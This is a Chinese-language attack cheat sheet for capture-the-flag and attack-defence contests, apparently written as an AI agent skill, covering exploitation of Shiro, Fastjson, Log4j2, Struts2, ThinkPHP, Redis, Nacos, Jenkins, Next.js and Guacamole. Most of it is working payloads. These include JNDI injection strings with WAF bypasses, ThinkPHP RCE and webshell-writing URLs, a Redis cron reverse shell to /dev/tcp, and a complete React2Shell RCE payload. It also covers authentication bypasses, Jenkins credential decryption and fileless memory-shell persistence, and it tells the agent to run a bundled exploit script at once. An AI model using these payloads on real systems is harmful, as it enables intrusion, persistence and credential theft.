# 中间件 / 框架漏洞速查（打点主弹药）

> 每节四要素：**认**（指纹特征）→ **打**（利用动作）→ **算成**（什么算拿下）→ **假点**（常见失败 & 别停姿势）。
> 比赛姿势：能上工具就上工具（快、稳、少手抖），手工只在工具不通时补枪。靶机不出网时一律想「正向 / 回连攻击机内网 IP」。

## Shiro

- **认**：登录响应 `Set-Cookie: rememberMe=deleteMe`；登录参数有 `rememberMe`。
- **打**：ShiroExploit 类工具一把梭：爆 key（默认 `kPH+bIxk5D2deZiIxcaaaA==`、`Z3VucwAAAAAAAAAAAAAAAA==` 等）→ 按 Shiro 版本选 CBC（≤1.4.1）或 GCM（≥1.4.2）→ 依次试利用链（CommonsBeanutils183/185、CommonsCollections 系列、Shiro 自带 ObjectProvider 链）。有回显选回显，无回显配 LDAP 反弹。
- **算成**：命令回显出 `id` / 反弹 shell。
- **假点**：key 通了链全炸 = 依赖对不上，**换链别停**（CB 链不依赖 CC，最优先试）；GCM 失败先确认工具版本新不新；靶机不出网 → 用回显链或 LDAP 打内网攻击机。爆 key 阶段用 dnslog/cookie 延时判通。

## Fastjson

- **认**：POST JSON 报错栈有 `com.alibaba.fastjson`；接口收 JSON。
- **打**：版本探测发 `{"@type":"java.lang.AutoCloseable"}`（故意只写 @type 看报错差异，非完整 payload）。经典通杀：
  - 1.2.24/1.2.47：`{"@type":"...JdbcRowSetImpl","dataSourceName":"ldap://攻击机/Exploit","autoCommit":true}`（1.2.47 用缓存绕过 autoType，无需开 autoType）
  - 1.2.68：`{"@type":"java.lang.AutoCloseable"}` 期待链 / BasicDataSource
  - 不通外网：BCEL（`$$BCEL$$` 字节码）、写文件链（aspectj）
  - 打法：JNDIExploit 起服务收回连。
- **算成**：LDAP 回连到攻击机 → 命令执行。
- **假点**：报错被吞 → 盲打用 dnslog（fastjson 解析失败有响应差）；靶机 JDK 8u191+ 高版本 → 远程类加载堵，JNDIExploit 的本地 gadget bypass 走起；autoType 黑名单严 → 1.2.68 期待类姿势。

## Log4j2

- **认**：Java 栈 Web 应用任何「输入会进日志」的点：UA、Referer、header、参数、JSON 字段。
- **打**：`${jndi:ldap://IP:1389/Exploit}` 打全量输入点。绕过变体：`${${lower:j}ndi:...}`、`${${::-j}ndi:...}`、`${${env:BARFOO:-j}ndi...}`（WAF 拦时）。JNDIExploit 起服务。
- **算成**：回连 + 命令执行。
- **假点**：高版本 JDK → 远程类加载堵，走 LDAP 本地工厂 gadget；无回显 → 先 dnslog 判通再上工具；靶机不出网 → ldap 指向攻击机内网 IP。

## Struts2

- **认**：`.action` / `.do` 后缀或路由；报错页带 Struts；`?debug=browser`。
- **打**：Struts2-Scan / Struts2 蛋糕工具编号检测，手工核心：**S2-045**（Content-Type 头 OGNL，最通吃，先打它）→ S2-046 → S2-057（namespace 注入）→ S2-061 → **S2-066（CVE-2023-50164，2026 年最新，编号不要停在 S2-061）**。devMode 直接 `?debug=command&expression=`。
- **★ S2-066 详情（CVE-2023-50164，Apache 官方）**：影响 **2.0.0–2.3.37 / 2.5.0–2.5.32 / 6.0.0–6.3.0.1**；修复 **6.3.0.2+ / 2.5.33**。
  性质 = **文件上传逻辑缺陷**（大小写混淆 case-insensitive 目录遍历）⇒ 可**覆盖/绕过上传路径限制再触发 RCE**（不是 OGNL 型）。
  **判据**：目标是 Struts2 **且存在上传功能**时优先试这条（与 S2-045 的"头注入"路径完全不同）。
- **算成**：OGNL 执行命令回显。
- **假点**：一个编号不通换下一个，别恋战；S2-045 回显空 → 换 S2-057/061；报错页没版本 → 全编号扫。

## ThinkPHP

- **认**：`X-Powered-By: ThinkPHP`；报错页 TP logo；`?s=` 路由。
- **打**（按命中率排序）：
  - 5.0.x/5.1.x：`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
  - 5.0.23：POST `?s=captcha`，`_method=__construct&filter[]=system&method=get&get[]=id`
  - 5.0.10-5.0.23：日志文件包含拿 shell（日志路径 `runtime/log/年月/日.log`，UA 里塞 PHP 代码）
  - 多语言：`?lang=../../../../../../usr/local/lib/php/pearcmd&+config/create+/<?=phpinfo()?>+shell.php`（pearcmd 包含写马）
  - **TP6 lang + pearcmd 四条坑位（实测，缺一条就不通）**：
    1. **目录深度要够**：`../` 数量不足到不了 `pearcmd.php` 所在目录 —— 先确认目标 PHP 的 pear 路径
    2. **`config-create` 的参数恰好 2 个**：多一个少一个都不写文件（写马靠第 2 个参数做文件名）
    3. **`lang` 必须是前置参数**：`?lang=...` 放在其它参数后面不生效
    4. **`<` `>` 被过滤时用 `chr()` 绕引号**：payload 里的 PHP 标签与引号用 `chr(60).chr(63)...` 拼接，避开 WAF
       > 绕过信号：页面回显不含 `<?php` 但文件已落地 ⇒ 就是标签被过滤，换 `chr()` 拼
  - TP6：找 phar 反序列化点（文件操作函数参数可控）
- **算成**：命令回显 / 落 webshell。
- **假点**：invokeFunction 被堵 → captcha 姿势；`system` 被禁函数 → `file_put_contents` 写马；RCE 全堵 → 日志/pearcmd 包含走起。版本只报错不等于没洞，姿势换着打。

## Redis

- **认**：6379；`redis-cli -h IP ping` 回 `PONG`（无密码即未授权）。
- **打**（未授权四连，按命中率排）：
  - 主从复制 RCE（redis-rogue-server / redis-ssrf-rce）：4.x/5.x 通吃，`config set dir /tmp` + `slaveof 攻击机` + so 模块加载 → 直接命令执行
  - 写 cron：`set x "\n\n*/1 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1\n\n"` + dir=/var/spool/cron + save
  - 写 ssh key：`dir=/root/.ssh` + `dbfilename=authorized_keys`
  - 写 webshell：知道 web 根时 `dir=/var/www/html` + `dbfilename=shell.php`
- **算成**：反弹 / webshell / 模块命令执行。
- **假点**：写成功没触发 = cron 服务没跑或路径不对 → 换 webshell；redis 6.x 主复姿势变 → 先写文件；靶机不出网 → cron 反弹死，webshell 走蚁剑正向。

## Nacos

- **认**：8848 端口；`/nacos/` 控制台。
- **打**：默认口令 `nacos/nacos`（还有 `nacos/8848`）。鉴权绕过：`User-Agent: Nacos-Server`（CVE-2021-29441）或 identity 头 `serverIdentity: security`（CVE-2021-29442）→ `GET /nacos/v1/auth/users?pageNo=1&pageSize=9` 列用户 → POST 添加管理员 → `GET /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99` 拉全配置。
- **算成**：控制台接管 + 配置里的数据库/中间件凭据（常直通 mysql）。
- **假点**：口令改了 → UA/identity 绕过再打；配置列表空 → search=blur 模糊拉；用户接口 403 → 先改 identity 头。

## WebLogic

## Jenkins

- **认**：8080 Jenkins 风格登录页；响应头 `X-Jenkins`。
- **打**（按命中率排序，磐石真题链在内）：
  - `/script` 未授权或弱口令进 → Groovy 一句话：`println "whoami".execute().text`
  - **API token 链（真题主线）**：debug 页/配置里抠到 admin API token → `POST /createItem` 建 Freestyle 任务（config.xml 写批处理/反弹 shell）→ `POST /job/名/build` 触发构建 → shell 上线
  - **凭据解密链（真题出 flag 点）**：拿到文件读后，取 `/var/jenkins_home/secrets/master.key` + `credentials.xml` → `jenkins-decrypt` 脚本解出**存的所有明文凭据**（SSH 密码/数据库口令，直通内网其它机器）
  - CVE-2024-23897（CLI `@file` 任意文件读，POST `/cli?remoting=false`）、CVE-2018-1000861（无回显，配反弹）
- **算成**：Groovy 命令执行 / 凭据解密拿到横向口令。
- **假点**：`/script` 403 → 弱口令字典（jenkins/jenkins、admin/admin123）；CLI 端口堵 → 只走 web；token 建任务报 CSRF 403 → 先 GET `/crumbIssuer/api/json` 拿 crumb 带上。

## React2Shell（CVE-2025-55182 / CVE-2025-66478）— React RSC / Next.js App Router 预认证 RCE

- **认**：`X-Powered-By: Next.js` + 页面含 `self.__next_f.push` Flight 流（App Router/RSC）；React 19.0.0–19.2.0 / react-server-dom-*（webpack/parcel/turbopack）未 patch 版，Next.js 15.x/16.x 各线补丁前。Dify 类自托管前端高频出镜（`data-api-prefix`、`/apps` 路由）。2025-12 后新靶场热门。
- **打**：任意路由 POST（`/`、`/apps` 都行），头 `Next-Action: x`（**任意值，无需有效 action ID**，无需认证）+ `Content-Type: multipart/form-data`；name=`"0"` 放伪造 chunk JSON，name=`"1"` 放 `"$@0"`：

  ```json
  {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"<JS代码>","_formData":{"get":"$1:constructor:constructor"}}}
  ```

  原理：Flight 反序列化路径解析缺 `hasOwnProperty` 检查，`$1:__proto__:then` 原型链穿越劫持 `Chunk.prototype.then`，`$1:constructor:constructor` 取到 Function 构造器，`_prefix` 作为函数体被执行。
  **回显必须用 redirect 变体**：裸 PoC 是盲打——链执行完 promise 永不 settle，HTTP 挂起到超时（实测 25s+），别在这上面耗。`_prefix` 填：
  `var o=Buffer.from(process.mainModule.require('child_process').execSync('CMD')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;`
  输出从响应头 `x-action-redirect`（格式 `http://x/{base64};push`）取出，base64 解码，秒回。
  现成武器（skill 自带）：`<skill根目录>/scripts/react2shell.sh <URL> '<CMD>'`（bash，Git Bash 直接跑）。
  路径写法用**相对 skill 根**——本技能可能装在 `.agents/skills/ctf-0day` 或 `.codex/skills/ctf-0day`，写死绝对路径会在另一份上失效。
  **有词条 + 有武器时直接开火，禁止重写脚本重造轮子**（2026-09 教训：三个会话各写了一份同功能脚本，每份白耗 30-40 秒）。
- **算成**：HTTP 303 + `x-action-redirect` 头带回命令输出；身份通常是容器 root；flag 常在 `/flag`。
- **假点**：HTTP 200 正常渲染 = 载荷没进反序列化（查 multipart 格式与 Next-Action 头）；**HTTP 500 + 纯数字 digest = execSync 遇非零退出码抛异常，不是洞不通**——命令链必须 `; true` / `&& true` 收尾；`_prefix` 里的命令**禁双引号**（破坏外层 JSON），单引号需转义、无引号写法最稳；Edge Runtime 部署无效（无 `process.mainModule`）。

## 内存马（Java 应用打进后的免杀持久化）

> Shiro/反序列化/任意文件上传打进去后，落 JSP 文件可能被杀/被 AWD 对手删——**内存马不留盘**，重启才消失。AWD 拿分利器。

- **Filter 型（最常用）**：工具一键注入——冰蝎/AntSword 自带内存马生成菜单、`memshell` 类脚本。原理：运行时向 `StandardContext` 注册恶意 Filter，URL 映射到 `/ico` 类伪装路径，Filter 里解密参数执行命令
- **Servlet 型**：动态注册 Servlet 到 `/x` 路径；**Listener 型**：request 监听器执行（更隐蔽，无 URL 特征）；**Agent 型**：attach 注入（最隐蔽，重启不消失，比赛少用）
- **打法**：已有冰蝎/AntSword 连接时直接用客户端"内存马"菜单注入；只有回显 RCE 时用 jsp 注入脚本（参数带 class 字节码 base64）
- **连接**：注入后用冰蝎/AntSword 连 `http://IP:PORT/映射路径`，密码即注入时设置的 pass
- **假点**：注入后连不上 → 映射路径要和注册的一致；对手重启服务你的内存马失效（AWD 场景换文件马+循环守护）；排查视角见 `内存马排查.md`（同一枚硬币的两面）

## Guacamole 网关（无客户端远程桌面网关；2026-10 补）

> **为什么单列一节**：这是「**浏览器右键 → 打开控制台**」这类平台（演练/云桌面/堡垒机）最常见的实现。
> 它的价值不在单个洞，而在**它是通往多台机器的门** —— 一个凭据 = 一堆内网会话。
> 来源：[BreachBits 暴露面分析（2026-01）](https://www.breachbits.com/blog/c5804b05-4dab-4e93-8120-ea5cbd69d65e)、
> [Laluka: RCE with SSRF and File Write on Apache Guacamole](https://thinkloveshare.com/hacking/hacking_guacamole_to_trigger_avocado/)

### 认（指纹）

| 看什么 | 值 |
|---|---|
| 路径 | `/guacamole/`；API 在 `/api/tokens`、`/api/session/...` |
| 默认凭据 | **`guacadmin:guacadmin`**；自建镜像也可能是 `test:test`（后者在 bug bounty 里实测命中过） |
| 端口组合 | Web 8080/8443 + **`guacd` 4822**（网关自身无 RDP/VNC 能力，靠 guacd 转发） |
| 联动组件 | Tomcat（8080/8009 AJP）、PostgreSQL 5432（属常见一体镜像） |
| passive 承认 | 登录页按钮/静态资源路径含 `guacamole`；页面 JS 里有 `Guacamole.WebSocketTunnel` |

### 打：三条通路，按"离目标多近"排

**通路 1（最干净）—— 直接谈底层标准协议**

Guacamole 只是**协议网关**：真正的会话是 **RDP/VNC/SSH/telnet/k8s**。
一旦你拿到「连接定义」（目标主机、端口、账号密码）或发现**跳板机/靶机本身开放了 3389/5900/22**，
就**完全可以绕开 Guacamole 和浏览器**，用原生客户端直连：

```bash
# RDP
xfreerdp /v:<ip>:3389 /u:<user> /p:<pass> /cert:ignore /dynamic-resolution
# VNC
vncviewer <ip>:5900
# SSH
ssh <user>@<ip> -p <port>
```
> **这就是"纯协议"的答案**：不是去找平台的 API，而是**认出它只是个转发器，然后直连被转发的东西**。

**通路 2 —— 平台自身的 REST API / WebSocket（想看连接定义与凭据时）**

```text
# 认证换票据（表单，data source 名与数据源类型对应：postgresql/mysql/sqlite 等）
POST /api/tokens        username=…&password=…        → 返回 authToken + dataSource
# 列连接（拿到目标主机/端口/协议/凭据字段）
GET  /api/session/data/<数据源>/connections?token=<authToken>
# 隧道：浏览器侧走 WebSocket，子协议固定 guacamole
WS   /api/session/<...>/tunnel?token=<authToken>     Sec-WebSocket-Protocol: guacamole
```
- **自动化注意**：guacd 的隧道协议**不好手搓**（Laluka 原文明确说"quite painful to mimic"：
  自己造字节时**非打印字节会丢**，服务端只回截图），所以稳定做法是
  **puppeteer / playwright 驱动浏览器 + 挂钩 WebSocket**（作者本人后续走的就是这条路，见其 `Failed02` 篇）
- 同类平台（自研演练系统）通常是"自己的 API + 自己的 Web 终端"，此时按
  **前端主 JS 里抽接口** 的路子打（见 `web/recon-methodology.md`）

**通路 3 —— 若 guacd 4822 直接可达（少见但一旦命中收益最高）**

guacd 是转发器的内核，直连它等于**跳过所有认证**，可自行指定要连的目标主机与凭据。

### 后认证原语：两条链条（有 Guacamole 账号就能用）

**原语 A：telnet 连接的「会话录制」= 任意路径写文件**

创建 **telnet** 连接时，可指定**录制目录与文件名**，且**不限目标 IP/端口、不限落盘路径与扩展名**：

- **链条 A1 → JSP webshell**：录制路径写进 Tomcat 的 `webapps/ROOT/`，文件名 `x.jsp`，
  连接建立后强制一行换行**结束会话以触发落盘**（浏览器侧快捷键唤出侧栏、粘贴往返内容即可），
  再访问 `/x.jsp?cmd=id`。**前提：guacd 与 Tomcat 同容器/同机**（一体镜像成立，docker-compose 分散部署不成立）
- **链条 A2 → SSH 免密登录**：把公钥写进 `~/.ssh/authorized_keys2`（用 `2` 避免覆盖原文件）。
  **即使 sshd 没对外暴露也成立** —— Guacamole 自己就能连它所在宿主机的 loopback
- **链条 A3 → 动态链接器**：写 `/etc/ld.so.conf.d/*.conf` 或 `/etc/ld.so.preload`（⚠ 后者写坏会 DoS）
- **链条 A4 → 定时任务**：写 crontab（⚠ **必须是干净文件**，混入录制产生的垃圾字符会让整份 crontab 失效）

**原语 B：guacd 的任意出站连接 = 从 loopback 发起的 SSRF**

telnet 连接本质上就是"让 guacd 去连某个 host:port"，**不限可达范围** ⇒ 可打只有 loopback 才信任的服务：

- **PostgreSQL**（信任 loopback ⇒ 无需挑战应答）→ 用 `multi/postgres/postgres_copy_from_program_cmd_exec`
  的字节流**无状态重放**即可执行命令 → 反弹 shell
- **AJP 8009**（loopback 上的 GhostCat 文件包含，运气好直接读文件）
- 任何 loopback-only 的内部管理接口

### 算成（分级，别越级报）

| 拿到什么 | 到了哪一步 |
|---|---|
| 只登录进 Guacamole 后台 | **只到"网关会话"** —— 不等于拿到任何目标主机 |
| 能列出/连上连接列表 | **到"多台内网会话的访问权"** —— 危害面随连接数放大（这一步本身已是高分） |
| 通过原语 A/B 落地 webshell、写 authorized_keys、命令执行 | **到"网关宿主机 RCE"** |
| 直连 RDP/VNC/SSH 成功 | **等价于绕过网关拿到目标系统权限** |

### 假点

- **4822 常只在容器内网可达**（`guacd` 与 Web 分离部署）⇒ 扫不到 4822 **不等于**没有 Guacamole
- **8080 是 Tomcat 的 ≠ guacd 可达它** —— 一体镜像与 docker-compose 的利用面差一个量级，
  **先判部署形态再选链条**（链条 A1 只在同容器时成立）
- **docker-compose 下文件写在 guacd 容器里**，写不进 Tomcat 的 webroot ⇒ A1 直接放弃，转 A2/A3
- **手搓 WS 协议解不出响应是常态**（非打印字节丢失、只回截图）⇒ 别在"写协议"上耗，
  先截一张图确认连接真的建立了，再决定用 puppeteer 自动化
- **"能登录 Guacamole 后台" ≠ "拿到目标系统 shell"** —— 报危害时说清是哪一层
- **它是堡垒机**：如果目标网络里的 Guacamole 属于**演练平台自身**，动它等于攻击平台（红线，见赛制规定）

### 应急/取证视角（反向用法）

- **告警线索**：同一来源 IP 对 `/api/tokens` 的**低速、多账号、少密码**的认证尝试
  （["many accounts, few passwords, low-and-slow"](https://www.breachbits.com/blog/c5804b05-4dab-4e93-8120-ea5cbd69d65e) 是口令喷洒的标准形状）
- **用 RDP 做入口的攻击**：Windows 侧定入口靠 **4624 Logon Type 10**（见 `应急-Windows深度取证.md`）
- **收到 Guacamole 会话录制文件（typescript 格式）时**：它是**明文 + 少量头尾垃圾** ⇒ `strings` 就能读操作记录
- **两条记录链**：连接记录在数据库（`guacamole_connection*` 系列表），会话录制在录制目录 ⇒ 两边对时间线
